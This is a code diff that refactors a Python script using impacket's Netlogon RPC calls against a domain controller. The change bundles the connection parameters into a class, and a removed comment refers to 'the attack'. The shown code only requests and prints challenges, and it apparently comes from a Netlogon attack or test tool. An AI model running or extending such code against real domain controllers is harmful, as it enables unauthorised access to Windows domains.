@@ -4,8 +4,15 @@ from impacket.dcerpc.v5 import transport
 from impacket import crypto
 from binascii import hexlify, unhexlify
 from subprocess import check_call
-
 import hmac, hashlib, struct, sys, socket, time, itertools, uuid
+
+class userlog:
+    def __init__(self, dc_name, computer_name, account_name, account_password, dc_ip):
+        self.dc_name = dc_name
+        self.computer_name = computer_name
+        self.account_name = account_name
+        self.account_password = account_password
+        self.dc_ip = dc_ip
 
 def fail(msg):
     print(msg, file=sys.stderr)
@@ -24,9 +31,9 @@ def ConnectRPCServer(dc_ip):
         raise
     return rpc_con
 
-def authenticate(rpc_con, dc_name, computer_name, account_name, account_password, dc_ip):
+def authenticate(rpc_con, user):
     Client_Challenge = uuid.uuid4().hex.encode()
-    status = nrpc.hNetrServerReqChallenge(rpc_con, dc_name, computer_name, Client_Challenge)
+    status = nrpc.hNetrServerReqChallenge(rpc_con, user.dc_name, user.computer_name, Client_Challenge)
     if (status == None or status['ErrorCode'] != 0):
         fail(f'Error NetrServerReqChallenge')
     else:
@@ -35,12 +42,12 @@ def authenticate(rpc_con, dc_name, computer_name, account_name, account_password
         print("Client_Challenge : ", Client_Challenge)
         print("Server_Challenge : ", Server_Challenge)
 
-def InitiateSecureChannel(dc_name, computer_name, account_name, account_password, dc_ip):
-    rpc_con = ConnectRPCServer(dc_ip)
+def InitiateSecureChannel(user):
+    rpc_con = ConnectRPCServer(user.dc_ip)
     try :
-        authenticate(rpc_con, dc_name, computer_name, account_name, account_password, dc_ip)
+        authenticate(rpc_con, user)
     except nrpc.DCERPCSessionError as ex:
-        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
+        # Failure should be due to a STATUS_ACCESS_DENIED error.
         if ex.get_error_code() == 0xc0000022:
             pass
         else:
@@ -63,7 +70,8 @@ def main():
         print("Account Name : ", account_name)
         print("Account Password : ", account_password)
         print("Initiate Secure Channel ...")
-        InitiateSecureChannel(dc_name, computer_name, account_name, account_password, dc_ip)
+        user = userlog(dc_name, computer_name, account_name, account_password, dc_ip)
+        InitiateSecureChannel(user)
 
 if __name__ == '__main__':
     main()
